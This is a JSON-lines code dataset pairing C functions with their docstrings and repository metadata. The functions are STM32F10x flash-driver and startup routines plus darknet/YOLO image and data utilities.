{"docstring": "/**\n  * @brief  Returns the FLASH Bank1 Status.\n  * @note   This function can be used for all STM32F10x devices, it is equivalent\n  *         to FLASH_GetStatus function.\n  * @param  None\n  * @retval FLASH Status: The returned value can be: FLASH_BUSY, FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP or FLASH_COMPLETE\n  */\n", "func_signal": "FLASH_Status FLASH_GetBank1Status(void)", "code": "{\n  FLASH_Status flashstatus = FLASH_COMPLETE;\n  \n  if((FLASH->SR & FLASH_FLAG_BANK1_BSY) == FLASH_FLAG_BSY) \n  {\n    flashstatus = FLASH_BUSY;\n  }\n  else \n  {  \n    if((FLASH->SR & FLASH_FLAG_BANK1_PGERR) != 0)\n    { \n      flashstatus = FLASH_ERROR_PG;\n    }\n    else \n    {\n      if((FLASH->SR & FLASH_FLAG_BANK1_WRPRTERR) != 0 )\n      {\n        flashstatus = FLASH_ERROR_WRP;\n      }\n      else\n      {\n        flashstatus = FLASH_COMPLETE;\n      }\n    }\n  }\n  /* Return the Flash Status */\n  return flashstatus;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Erases a specified FLASH page.\n  * @note   This function can be used for all STM32F10x devices.\n  * @param  Page_Address: The page address to be erased.\n  * @retval FLASH Status: The returned value can be: FLASH_BUSY, FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT.\n  */\n", "func_signal": "FLASH_Status FLASH_ErasePage(uint32_t Page_Address)", "code": "{\n  FLASH_Status status = FLASH_COMPLETE;\n  /* Check the parameters */\n  assert_param(IS_FLASH_ADDRESS(Page_Address));\n\n#ifdef STM32F10X_XL\n  if(Page_Address < FLASH_BANK1_END_ADDRESS)  \n  {\n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastBank1Operation(EraseTimeout);\n    if(status == FLASH_COMPLETE)\n    { \n      /* if the previous operation is completed, proceed to erase the page */\n      FLASH->CR|= CR_PER_Set;\n      FLASH->AR = Page_Address; \n      FLASH->CR|= CR_STRT_Set;\n    \n      /* Wait for last operation to be completed */\n      status = FLASH_WaitForLastBank1Operation(EraseTimeout);\n\n      /* Disable the PER Bit */\n      FLASH->CR &= CR_PER_Reset;\n    }\n  }\n  else\n  {\n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastBank2Operation(EraseTimeout);\n    if(status == FLASH_COMPLETE)\n    { \n      /* if the previous operation is completed, proceed to erase the page */\n      FLASH->CR2|= CR_PER_Set;\n      FLASH->AR2 = Page_Address; \n      FLASH->CR2|= CR_STRT_Set;\n    \n      /* Wait for last operation to be completed */\n      status = FLASH_WaitForLastBank2Operation(EraseTimeout);\n      \n      /* Disable the PER Bit */\n      FLASH->CR2 &= CR_PER_Reset;\n    }\n  }\n#else\n  /* Wait for last operation to be completed */\n  status = FLASH_WaitForLastOperation(EraseTimeout);\n  \n  if(status == FLASH_COMPLETE)\n  { \n    /* if the previous operation is completed, proceed to erase the page */\n    FLASH->CR|= CR_PER_Set;\n    FLASH->AR = Page_Address; \n    FLASH->CR|= CR_STRT_Set;\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastOperation(EraseTimeout);\n    \n    /* Disable the PER Bit */\n    FLASH->CR &= CR_PER_Reset;\n  }\n#endif /* STM32F10X_XL */\n\n  /* Return the Erase Status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  This is the code that gets called when the processor first\n  *         starts execution following a reset event. Only the absolutely\n  *         necessary set is performed, after which the application\n  *         supplied main() routine is called. \n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void Default_Reset_Handler(void)", "code": "{\n  /* Initialize data and bss */\n  unsigned long *pulSrc, *pulDest;\n\n  /* Copy the data segment initializers from flash to SRAM */\n  pulSrc = &_sidata;\n\n  for(pulDest = &_sdata; pulDest < &_edata; )\n  {\n    *(pulDest++) = *(pulSrc++);\n  }\n  \n  /* Zero fill the bss segment.  This is done with inline assembly since this\n     will clear the value of pulDest if it is not kept in a register. */\n  __asm(\"  ldr     r0, =_sbss\\n\"\n        \"  ldr     r1, =_ebss\\n\"\n        \"  mov     r2, #0\\n\"\n        \"  .thumb_func\\n\"\n        \"zero_loop:\\n\"\n        \"    cmp     r0, r1\\n\"\n        \"    it      lt\\n\"\n        \"    strlt   r2, [r0], #4\\n\"\n        \"    blt     zero_loop\");\n  \n  /* Setup the microcontroller system. */\n  SystemInit();\n    \n  /* Call the application's entry point.*/\n  main();\n}", "path": "STM32F103/Example_Sonar/cmsis_boot/startup/startup_stm32f10x_md.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Enables or disables the Half cycle flash access.\n  * @note   This function can be used for all STM32F10x devices.\n  * @param  FLASH_HalfCycleAccess: specifies the FLASH Half cycle Access mode.\n  *   This parameter can be one of the following values:\n  *     @arg FLASH_HalfCycleAccess_Enable: FLASH Half Cycle Enable\n  *     @arg FLASH_HalfCycleAccess_Disable: FLASH Half Cycle Disable\n  * @retval None\n  */\n", "func_signal": "void FLASH_HalfCycleAccessCmd(uint32_t FLASH_HalfCycleAccess)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FLASH_HALFCYCLEACCESS_STATE(FLASH_HalfCycleAccess));\n  \n  /* Enable or disable the Half cycle access */\n  FLASH->ACR &= ACR_HLFCYA_Mask;\n  FLASH->ACR |= FLASH_HalfCycleAccess;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Checks whether the FLASH Read Out Protection Status is set or not.\n  * @note   This function can be used for all STM32F10x devices.\n  * @param  None\n  * @retval FLASH ReadOut Protection Status(SET or RESET)\n  */\n", "func_signal": "FlagStatus FLASH_GetReadOutProtectionStatus(void)", "code": "{\n  FlagStatus readoutstatus = RESET;\n  if ((FLASH->OBR & RDPRT_Mask) != (uint32_t)RESET)\n  {\n    readoutstatus = SET;\n  }\n  else\n  {\n    readoutstatus = RESET;\n  }\n  return readoutstatus;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Erases all Bank1 FLASH pages.\n  * @note   This function can be used for all STM32F10x devices.\n  *         - For STM32F10X_XL devices this function erases all Bank1 pages.\n  *         - For all other devices it erases all Bank1 pages and it is equivalent \n  *           to FLASH_EraseAllPages function.\n  * @param  None\n  * @retval FLASH Status: The returned value can be: FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT.\n  */\n", "func_signal": "FLASH_Status FLASH_EraseAllBank1Pages(void)", "code": "{\n  FLASH_Status status = FLASH_COMPLETE;\n  /* Wait for last operation to be completed */\n  status = FLASH_WaitForLastBank1Operation(EraseTimeout);\n  \n  if(status == FLASH_COMPLETE)\n  {\n    /* if the previous operation is completed, proceed to erase all pages */\n     FLASH->CR |= CR_MER_Set;\n     FLASH->CR |= CR_STRT_Set;\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastBank1Operation(EraseTimeout);\n    \n    /* Disable the MER Bit */\n    FLASH->CR &= CR_MER_Reset;\n  }    \n  /* Return the Erase Status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Returns the FLASH Status.\n  * @note   This function can be used for all STM32F10x devices, it is equivalent\n  *         to FLASH_GetBank1Status function.\n  * @param  None\n  * @retval FLASH Status: The returned value can be: FLASH_BUSY, FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP or FLASH_COMPLETE\n  */\n", "func_signal": "FLASH_Status FLASH_GetStatus(void)", "code": "{\n  FLASH_Status flashstatus = FLASH_COMPLETE;\n  \n  if((FLASH->SR & FLASH_FLAG_BSY) == FLASH_FLAG_BSY) \n  {\n    flashstatus = FLASH_BUSY;\n  }\n  else \n  {  \n    if((FLASH->SR & FLASH_FLAG_PGERR) != 0)\n    { \n      flashstatus = FLASH_ERROR_PG;\n    }\n    else \n    {\n      if((FLASH->SR & FLASH_FLAG_WRPRTERR) != 0 )\n      {\n        flashstatus = FLASH_ERROR_WRP;\n      }\n      else\n      {\n        flashstatus = FLASH_COMPLETE;\n      }\n    }\n  }\n  /* Return the Flash Status */\n  return flashstatus;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Unlocks the FLASH Bank1 Program Erase Controller.\n  * @note   This function can be used for all STM32F10x devices.\n  *         - For STM32F10X_XL devices this function unlocks Bank1.\n  *         - For all other devices it unlocks Bank1 and it is \n  *           equivalent to FLASH_Unlock function.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void FLASH_UnlockBank1(void)", "code": "{\n  /* Authorize the FPEC of Bank1 Access */\n  FLASH->KEYR = FLASH_KEY1;\n  FLASH->KEYR = FLASH_KEY2;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Erases the FLASH option bytes.\n  * @note   This functions erases all option bytes except the Read protection (RDP). \n  * @note   This function can be used for all STM32F10x devices.\n  * @param  None\n  * @retval FLASH Status: The returned value can be: FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT.\n  */\n", "func_signal": "FLASH_Status FLASH_EraseOptionBytes(void)", "code": "{\n  uint16_t rdptmp = RDP_Key;\n\n  FLASH_Status status = FLASH_COMPLETE;\n\n  /* Get the actual read protection Option Byte value */ \n  if(FLASH_GetReadOutProtectionStatus() != RESET)\n  {\n    rdptmp = 0x00;  \n  }\n\n  /* Wait for last operation to be completed */\n  status = FLASH_WaitForLastOperation(EraseTimeout);\n  if(status == FLASH_COMPLETE)\n  {\n    /* Authorize the small information block programming */\n    FLASH->OPTKEYR = FLASH_KEY1;\n    FLASH->OPTKEYR = FLASH_KEY2;\n    \n    /* if the previous operation is completed, proceed to erase the option bytes */\n    FLASH->CR |= CR_OPTER_Set;\n    FLASH->CR |= CR_STRT_Set;\n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastOperation(EraseTimeout);\n    \n    if(status == FLASH_COMPLETE)\n    {\n      /* if the erase operation is completed, disable the OPTER Bit */\n      FLASH->CR &= CR_OPTER_Reset;\n       \n      /* Enable the Option Bytes Programming operation */\n      FLASH->CR |= CR_OPTPG_Set;\n      /* Restore the last read protection Option Byte value */\n      OB->RDP = (uint16_t)rdptmp; \n      /* Wait for last operation to be completed */\n      status = FLASH_WaitForLastOperation(ProgramTimeout);\n \n      if(status != FLASH_TIMEOUT)\n      {\n        /* if the program operation is completed, disable the OPTPG Bit */\n        FLASH->CR &= CR_OPTPG_Reset;\n      }\n    }\n    else\n    {\n      if (status != FLASH_TIMEOUT)\n      {\n        /* Disable the OPTPG Bit */\n        FLASH->CR &= CR_OPTPG_Reset;\n      }\n    }  \n  }\n  /* Return the erase status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Waits for a Flash operation on Bank1 to complete or a TIMEOUT to occur.\n  * @note   This function can be used for all STM32F10x devices, \n  *         it is equivalent to FLASH_WaitForLastOperation.\n  * @param  Timeout: FLASH programming Timeout\n  * @retval FLASH Status: The returned value can be: FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT.\n  */\n", "func_signal": "FLASH_Status FLASH_WaitForLastBank1Operation(uint32_t Timeout)", "code": "{ \n  FLASH_Status status = FLASH_COMPLETE;\n   \n  /* Check for the Flash Status */\n  status = FLASH_GetBank1Status();\n  /* Wait for a Flash operation to complete or a TIMEOUT to occur */\n  while((status == FLASH_FLAG_BANK1_BSY) && (Timeout != 0x00))\n  {\n    status = FLASH_GetBank1Status();\n    Timeout--;\n  }\n  if(Timeout == 0x00 )\n  {\n    status = FLASH_TIMEOUT;\n  }\n  /* Return the operation status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Unlocks the FLASH Program Erase Controller.\n  * @note   This function can be used for all STM32F10x devices.\n  *         - For STM32F10X_XL devices this function unlocks Bank1 and Bank2.\n  *         - For all other devices it unlocks Bank1 and it is equivalent \n  *           to FLASH_UnlockBank1 function.. \n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void FLASH_Unlock(void)", "code": "{\n  /* Authorize the FPEC of Bank1 Access */\n  FLASH->KEYR = FLASH_KEY1;\n  FLASH->KEYR = FLASH_KEY2;\n\n#ifdef STM32F10X_XL\n  /* Authorize the FPEC of Bank2 Access */\n  FLASH->KEYR2 = FLASH_KEY1;\n  FLASH->KEYR2 = FLASH_KEY2;\n#endif /* STM32F10X_XL */\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Erases all FLASH pages.\n  * @note   This function can be used for all STM32F10x devices.\n  * @param  None\n  * @retval FLASH Status: The returned value can be: FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT.\n  */\n", "func_signal": "FLASH_Status FLASH_EraseAllPages(void)", "code": "{\n  FLASH_Status status = FLASH_COMPLETE;\n\n#ifdef STM32F10X_XL\n  /* Wait for last operation to be completed */\n  status = FLASH_WaitForLastBank1Operation(EraseTimeout);\n  \n  if(status == FLASH_COMPLETE)\n  {\n    /* if the previous operation is completed, proceed to erase all pages */\n     FLASH->CR |= CR_MER_Set;\n     FLASH->CR |= CR_STRT_Set;\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastBank1Operation(EraseTimeout);\n    \n    /* Disable the MER Bit */\n    FLASH->CR &= CR_MER_Reset;\n  }    \n  if(status == FLASH_COMPLETE)\n  {\n    /* if the previous operation is completed, proceed to erase all pages */\n     FLASH->CR2 |= CR_MER_Set;\n     FLASH->CR2 |= CR_STRT_Set;\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastBank2Operation(EraseTimeout);\n    \n    /* Disable the MER Bit */\n    FLASH->CR2 &= CR_MER_Reset;\n  }\n#else\n  /* Wait for last operation to be completed */\n  status = FLASH_WaitForLastOperation(EraseTimeout);\n  if(status == FLASH_COMPLETE)\n  {\n    /* if the previous operation is completed, proceed to erase all pages */\n     FLASH->CR |= CR_MER_Set;\n     FLASH->CR |= CR_STRT_Set;\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastOperation(EraseTimeout);\n\n    /* Disable the MER Bit */\n    FLASH->CR &= CR_MER_Reset;\n  }\n#endif /* STM32F10X_XL */\n\n  /* Return the Erase Status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Programs a half word at a specified Option Byte Data address.\n  * @note   This function can be used for all STM32F10x devices.\n  * @param  Address: specifies the address to be programmed.\n  *   This parameter can be 0x1FFFF804 or 0x1FFFF806. \n  * @param  Data: specifies the data to be programmed.\n  * @retval FLASH Status: The returned value can be: FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT. \n  */\n", "func_signal": "FLASH_Status FLASH_ProgramOptionByteData(uint32_t Address, uint8_t Data)", "code": "{\n  FLASH_Status status = FLASH_COMPLETE;\n  /* Check the parameters */\n  assert_param(IS_OB_DATA_ADDRESS(Address));\n  status = FLASH_WaitForLastOperation(ProgramTimeout);\n\n  if(status == FLASH_COMPLETE)\n  {\n    /* Authorize the small information block programming */\n    FLASH->OPTKEYR = FLASH_KEY1;\n    FLASH->OPTKEYR = FLASH_KEY2;\n    /* Enables the Option Bytes Programming operation */\n    FLASH->CR |= CR_OPTPG_Set; \n    *(__IO uint16_t*)Address = Data;\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastOperation(ProgramTimeout);\n    if(status != FLASH_TIMEOUT)\n    {\n      /* if the program operation is completed, disable the OPTPG Bit */\n      FLASH->CR &= CR_OPTPG_Reset;\n    }\n  }\n  /* Return the Option Byte Data Program Status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Returns the FLASH Bank2 Status.\n  * @note   This function can be used for STM32F10x_XL density devices.\n  * @param  None\n  * @retval FLASH Status: The returned value can be: FLASH_BUSY, FLASH_ERROR_PG,\n  *        FLASH_ERROR_WRP or FLASH_COMPLETE\n  */\n", "func_signal": "FLASH_Status FLASH_GetBank2Status(void)", "code": "{\n  FLASH_Status flashstatus = FLASH_COMPLETE;\n  \n  if((FLASH->SR2 & (FLASH_FLAG_BANK2_BSY & 0x7FFFFFFF)) == (FLASH_FLAG_BANK2_BSY & 0x7FFFFFFF)) \n  {\n    flashstatus = FLASH_BUSY;\n  }\n  else \n  {  \n    if((FLASH->SR2 & (FLASH_FLAG_BANK2_PGERR & 0x7FFFFFFF)) != 0)\n    { \n      flashstatus = FLASH_ERROR_PG;\n    }\n    else \n    {\n      if((FLASH->SR2 & (FLASH_FLAG_BANK2_WRPRTERR & 0x7FFFFFFF)) != 0 )\n      {\n        flashstatus = FLASH_ERROR_WRP;\n      }\n      else\n      {\n        flashstatus = FLASH_COMPLETE;\n      }\n    }\n  }\n  /* Return the Flash Status */\n  return flashstatus;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Enables or disables the specified FLASH interrupts.\n  * @note   This function can be used for all STM32F10x devices.\n  *         - For STM32F10X_XL devices, enables or disables the specified FLASH interrupts\n              for Bank1 and Bank2.\n  *         - For other devices it enables or disables the specified FLASH interrupts for Bank1.\n  * @param  FLASH_IT: specifies the FLASH interrupt sources to be enabled or disabled.\n  *   This parameter can be any combination of the following values:\n  *     @arg FLASH_IT_ERROR: FLASH Error Interrupt\n  *     @arg FLASH_IT_EOP: FLASH end of operation Interrupt\n  * @param  NewState: new state of the specified Flash interrupts.\n  *   This parameter can be: ENABLE or DISABLE.      \n  * @retval None \n  */\n", "func_signal": "void FLASH_ITConfig(uint32_t FLASH_IT, FunctionalState NewState)", "code": "{\n#ifdef STM32F10X_XL\n  /* Check the parameters */\n  assert_param(IS_FLASH_IT(FLASH_IT)); \n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if((FLASH_IT & 0x80000000) != 0x0)\n  {\n    if(NewState != DISABLE)\n    {\n      /* Enable the interrupt sources */\n      FLASH->CR2 |= (FLASH_IT & 0x7FFFFFFF);\n    }\n    else\n    {\n      /* Disable the interrupt sources */\n      FLASH->CR2 &= ~(uint32_t)(FLASH_IT & 0x7FFFFFFF);\n    }\n  }\n  else\n  {\n    if(NewState != DISABLE)\n    {\n      /* Enable the interrupt sources */\n      FLASH->CR |= FLASH_IT;\n    }\n    else\n    {\n      /* Disable the interrupt sources */\n      FLASH->CR &= ~(uint32_t)FLASH_IT;\n    }\n  }\n#else\n  /* Check the parameters */\n  assert_param(IS_FLASH_IT(FLASH_IT)); \n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if(NewState != DISABLE)\n  {\n    /* Enable the interrupt sources */\n    FLASH->CR |= FLASH_IT;\n  }\n  else\n  {\n    /* Disable the interrupt sources */\n    FLASH->CR &= ~(uint32_t)FLASH_IT;\n  }\n#endif /* STM32F10X_XL */\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Unlocks the FLASH Bank2 Program Erase Controller.\n  * @note   This function can be used only for STM32F10X_XL density devices.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void FLASH_UnlockBank2(void)", "code": "{\n  /* Authorize the FPEC of Bank2 Access */\n  FLASH->KEYR2 = FLASH_KEY1;\n  FLASH->KEYR2 = FLASH_KEY2;\n\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Waits for a Flash operation on Bank2 to complete or a TIMEOUT to occur.\n  * @note   This function can be used only for STM32F10x_XL density devices.\n  * @param  Timeout: FLASH programming Timeout\n  * @retval FLASH Status: The returned value can be: FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT.\n  */\n", "func_signal": "FLASH_Status FLASH_WaitForLastBank2Operation(uint32_t Timeout)", "code": "{ \n  FLASH_Status status = FLASH_COMPLETE;\n   \n  /* Check for the Flash Status */\n  status = FLASH_GetBank2Status();\n  /* Wait for a Flash operation to complete or a TIMEOUT to occur */\n  while((status == (FLASH_FLAG_BANK2_BSY & 0x7FFFFFFF)) && (Timeout != 0x00))\n  {\n    status = FLASH_GetBank2Status();\n    Timeout--;\n  }\n  if(Timeout == 0x00 )\n  {\n    status = FLASH_TIMEOUT;\n  }\n  /* Return the operation status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Locks the FLASH Program Erase Controller.\n  * @note   This function can be used for all STM32F10x devices.\n  *         - For STM32F10X_XL devices this function Locks Bank1 and Bank2.\n  *         - For all other devices it Locks Bank1 and it is equivalent \n  *           to FLASH_LockBank1 function.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void FLASH_Lock(void)", "code": "{\n  /* Set the Lock Bit to lock the FPEC and the CR of  Bank1 */\n  FLASH->CR |= CR_LOCK_Set;\n\n#ifdef STM32F10X_XL\n  /* Set the Lock Bit to lock the FPEC and the CR of  Bank2 */\n  FLASH->CR2 |= CR_LOCK_Set;\n#endif /* STM32F10X_XL */\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "//This one might be too, can't remember.\n", "func_signal": "void col2im_cpu(float* data_col,\n         int channels,  int height,  int width,\n         int ksize,  int stride, int pad, float* data_im)", "code": "{\n    int c,h,w;\n    int height_col = (height + 2*pad - ksize) / stride + 1;\n    int width_col = (width + 2*pad - ksize) / stride + 1;\n\n    int channels_col = channels * ksize * ksize;\n    for (c = 0; c < channels_col; ++c) {\n        int w_offset = c % ksize;\n        int h_offset = (c / ksize) % ksize;\n        int c_im = c / ksize / ksize;\n        for (h = 0; h < height_col; ++h) {\n            for (w = 0; w < width_col; ++w) {\n                int im_row = h_offset + h * stride;\n                int im_col = w_offset + w * stride;\n                int col_index = (c * height_col + h) * width_col + w;\n                double val = data_col[col_index];\n                col2im_add_pixel(data_im, height, width, channels,\n                        im_row, im_col, c_im, pad, val);\n            }\n        }\n    }\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/col2im.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// Some day...\n// ^ What the hell is this comment for?\n", "func_signal": "layer network_output_layer(network *net)", "code": "{\n    int i;\n    for(i = net->n - 1; i >= 0; --i){\n        if(net->layers[i].type != COST) break;\n    }\n    return net->layers[i];\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/network.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\nchar **get_random_paths_indexes(char **paths, int n, int m, int *indexes)\n{\n    char **random_paths = calloc(n, sizeof(char*));\n    int i;\n    pthread_mutex_lock(&mutex);\n    for(i = 0; i < n; ++i){\n        int index = rand()%m;\n        indexes[i] = index;\n        random_paths[i] = paths[index];\n        if(i == 0) printf(\"%s\\n\", paths[index]);\n    }\n    pthread_mutex_unlock(&mutex);\n    return random_paths;\n}\n*/\n", "func_signal": "char **get_random_paths(char **paths, int n, int m)", "code": "{\n    char **random_paths = calloc(n, sizeof(char*));\n    int i;\n    pthread_mutex_lock(&mutex);\n    for(i = 0; i < n; ++i){\n        int index = rand()%m;\n        random_paths[i] = paths[index];\n        //if(i == 0) printf(\"%s\\n\", paths[index]);\n    }\n    pthread_mutex_unlock(&mutex);\n    return random_paths;\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/data.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// http://www.cs.rit.edu/~ncs/color/t_convert.html\n", "func_signal": "void rgb_to_hsv(image im)", "code": "{\n    assert(im.c == 3);\n    int i, j;\n    float r, g, b;\n    float h, s, v;\n    for(j = 0; j < im.h; ++j){\n        for(i = 0; i < im.w; ++i){\n            r = get_pixel(im, i , j, 0);\n            g = get_pixel(im, i , j, 1);\n            b = get_pixel(im, i , j, 2);\n            float max = three_way_max(r,g,b);\n            float min = three_way_min(r,g,b);\n            float delta = max - min;\n            v = max;\n            if(max == 0){\n                s = 0;\n                h = 0;\n            }else{\n                s = delta/max;\n                if(r == max){\n                    h = (g - b) / delta;\n                } else if (g == max) {\n                    h = 2 + (b - r) / delta;\n                } else {\n                    h = 4 + (r - g) / delta;\n                }\n                if (h < 0) h += 6;\n                h = h/6.;\n            }\n            set_pixel(im, i, j, 0, h);\n            set_pixel(im, i, j, 1, s);\n            set_pixel(im, i, j, 2, v);\n        }\n    }\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/image.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// old timing. is it better? who knows!!\n", "func_signal": "double get_wall_time()", "code": "{\n    struct timeval time;\n    if (gettimeofday(&time,NULL)){\n        return 0;\n    }\n    return (double)time.tv_sec + (double)time.tv_usec * .000001;\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/utils.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// http://www.cs.rit.edu/~ncs/color/t_convert.html\n", "func_signal": "void rgb_to_hsv(image im)", "code": "{\n    assert(im.c == 3);\n    int i, j;\n    float r, g, b;\n    float h, s, v;\n    for(j = 0; j < im.h; ++j){\n        for(i = 0; i < im.w; ++i){\n            r = get_pixel(im, i , j, 0);\n            g = get_pixel(im, i , j, 1);\n            b = get_pixel(im, i , j, 2);\n            float max = three_way_max(r,g,b);\n            float min = three_way_min(r,g,b);\n            float delta = max - min;\n            v = max;\n            if(max == 0){\n                s = 0;\n                h = 0;\n            }else{\n                s = delta/max;\n                if(r == max){\n                    h = (g - b) / delta;\n                } else if (g == max) {\n                    h = 2 + (b - r) / delta;\n                } else {\n                    h = 4 + (r - g) / delta;\n                }\n                if (h < 0) h += 6;\n                h = h/6.;\n            }\n            set_pixel(im, i, j, 0, h);\n            set_pixel(im, i, j, 1, s);\n            set_pixel(im, i, j, 2, v);\n        }\n    }\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/image.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
